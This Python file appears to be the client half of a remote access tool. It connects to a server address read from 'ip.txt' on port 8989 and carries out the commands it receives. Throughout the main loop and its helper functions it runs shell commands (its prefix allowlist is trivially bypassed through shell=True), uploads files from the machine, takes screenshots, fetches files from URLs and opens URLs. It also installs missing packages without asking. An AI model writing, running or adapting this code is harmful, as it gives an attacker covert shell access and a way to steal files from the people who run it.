valid_commands = [
   "ls", 
   "df", 
   "pwd", 
   "ipconfig",
   "ifconfig",
   "cat" , 
   "cd" , 
   "cd ..",
   "mkdir",
   "rm",
   "touch",
   "dir",
   "history",
   "mv",
   "cp",
   "stat",
   "kill",
   "whoami",
   "sc",
   "head",
   "tail"
   ]
valid_extensions = [".py", ".txt", ".cpp", ".java",".png",".jpg",".jpeg",".mp4",".pdf"]
downlodable_files=['.png','.jpg','.pdf','.db','.jpeg','.ppt','.docx','.jpeg','.gif','.txt','.py']
required_modules = [
    "logging",
    "time",
    "socket",
    "os",
    "subprocess",
    "re",
    "sys",
    "webbrowser",
    "requests",
    "mss"
]

def import_manage():
   import importlib
   import os
   import subprocess
   for module_name in required_modules:
      try:
         importlib.import_module(module_name)
      except ImportError:
         print(f"{module_name} is not installed. Installing...")
         # Check the operating system and use the appropriate command
         if os.name == 'posix':  # Unix-like systems (Linux, macOS)
            subprocess.call(["pip3", "install", module_name])
         elif os.name == 'nt':  # Windows
            subprocess.call(["pip", "install", module_name])
         else:
            print("Unsupported operating system. Please install the module manually.")
               # You might want to exit the script or take alternative action

try:
   from logging import exception
   import time
   import socket
   import os
   import subprocess
   import re
   import sys
   from sys import getsizeof
   import webbrowser
   import requests
   import mss
except ImportError:
   import_manage()
   from logging import exception
   import time
   import socket
   import os
   import subprocess
   import re
   from sys import getsizeof
   import sys
   import webbrowser
   import requests
   import mss
   

def send_socket(soc,filename,result):
   filesize=len(result)
   send=f'{filename}*{filesize}'.encode()
   soc.send(send)
   time.sleep(2)
   soc.send(result)
   
def take_scrrenshot(soc,command):
   try:
      with mss.mss() as sct:
         screenshot= sct.shot(output="image.jpeg")
      result="screenshot capture and saved".encode()
      filename="image.jpeg"
      send_socket(soc,filename,result)
   except Exception as e:
      result="screeshot not captured".encode()
      send_socket(soc,command,result)
   
def back_directory(soc,command):
   directroy= os.getcwd().split('/')
   new_directory="/".join(directroy[:len(directroy)-1])
   try:
      os.chdir(new_directory)
   except Exception as e:
      pass
   result = f"{os.getcwd()}".encode()
   send_socket(soc,command,result)
   

def front_directory(soc,command):
   directory=command.split()
   current_directory=os.getcwd()
   absoulte_path=os.path.join(current_directory,directory[-1])
   try:
      os.chdir(absoulte_path)
   except Exception as e:
      pass 
   result = f"{os.getcwd()}".encode()
   send_socket(soc,command,result)
   

def run_valid_commands(soc,command):
   request=command.split()
   try:
      #result = subprocess.Popen(request,stdout=subprocess.PIPE).communicate()[0]
      result = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
      stdout, stderr = result.communicate()
      if stdout.strip():
         send_socket(soc,command,stdout)
      elif stderr.strip():
         send_socket(soc,command,stderr)
      else:
         response="command sucessfully excuted".encode()
         send_socket(soc,command,response)
         
   except Exception as e:
      try:
         result.kill()
      except Exception as e:
         pass
      result="ERROR".encode()
      send_socket(soc,"INVALID",result)
    

def url_file_download(soc,command):
   try:
      response= requests.get(command.strip())
      open(command.split('/')[-1],"wb").write(response.content)
      result= "file downloaded sucessfully".encode()
   except Exception as e:
      result="some error occured".encode()
   send_socket(soc,command,result)

def open_url(soc,command):
   try:
      webbrowser.open(command,new=2)
      result="url is working..".encode()
      send_socket(soc,command,result)
   except Exception as e:
      result="can't open url..".encode()
      send_socket(soc,command,result)


def upload_file(soc,command):
   if os.path.isfile(command):
      # get the name of file from path 
      filename=command.split('/')[-1]
      #get the size of file 
      filesize=os.path.getsize(command)
      # send the name and size to server
      send=f'{filename}*{filesize}'.encode()
      soc.send(send)
      time.sleep(3)
      # open the file in binary mode
      with open(command,'rb') as f:
         # send the server signal to begin the transfer
         while True:
            # start sending data from file 
            content=f.read(1204)
            soc.send(content)
            # if no data left in file exit the loop
            if not content:
               print('{$} Breaking_from_sending_data')
               break
      time.sleep(3)
         ##send the ending signal to server 
   else:
      send_socket(soc,"False","ERROR".encode())
   
def close_socket(soc,command):
   print("[-]Connection close..")
   soc.close()
   sys.exit()

def unidentified_command(soc,command):
   send_socket(soc,'Invalid','Command not found...'.encode())
   
def is_valid_file_name(file_name):
   file_path_regex = re.compile(r'^([a-zA-Z0-9_\-\.\/]+\/)?[a-zA-Z0-9_\-\.]+\.[a-zA-Z0-9]+$')
   return bool(file_path_regex.match(file_name))

if __name__ == "__main__":
   soc = socket.socket()
   # hostname = socket.gethostname()
   ## getting the IP address using socket.gethostbyname() method
   #host = socket.gethostbyname(hostname)
   #host="192.168.0.104"
   #host=socket.gethostname()
   host=open("ip.txt","r").read()
   port=8989
   #8989
   
   # bind the socket with port and host
   soc.connect((host, port))
   print("[*]Connected to Server..")
   # regex to check if anylink is sended 
   url_regex = re.compile(
         r'^(?:http|ftp)s?://' # http:// or https://
         r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
         r'localhost|' #localhost...
         r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
         r'(?::\d+)?' # optional port
         r'(?:/?|[/?]\S+)$', re.IGNORECASE)
   
   while soc:
      command=soc.recv(1024).decode()
      print(f"($):{command}")
      # if it is file name and it's extensions end with downlodable file list
      if is_valid_file_name(command):
         if any(command.endswith(extension) for extension in downlodable_files):
            upload_file(soc,command)
         else:
            # if it's invalid extension..
            send_socket(soc,"False","ERROR".encode())
      # it only allow command that are in valid_command list
      elif any(command.startswith(condition) for condition in valid_commands):
         # it take care of change directory command
         if command.startswith('cd'):
            if command=="cd.." or command=="cd ..":
               back_directory(soc,command)
            else:
               front_directory(soc,command)
         # it take care of screenshot command ... 
         elif command=="sc":
            take_scrrenshot(soc,command)
         # it run command directly in shell 
         else:
            run_valid_commands(soc,command)
     
      # it only allow command that are in valid_command list
      # check if command is url 
      elif re.match(url_regex,command):
         # if url is downladable file 
         if any(command.endswith(extension) for extension in valid_extensions):
            url_file_download(soc,command)
         # just open commmand url .
         else:
            open_url(soc,command)
            
      # to exit the socket
      elif command=="end" or command=="exit" or command=="close":
         close_socket(soc,command)
         
      # manage invalid commands
      else:
         unidentified_command(soc,command)
      
          
         
          
      
   
   
      
      
     
            
             
         
         
      
      
      
               

            

      
      
      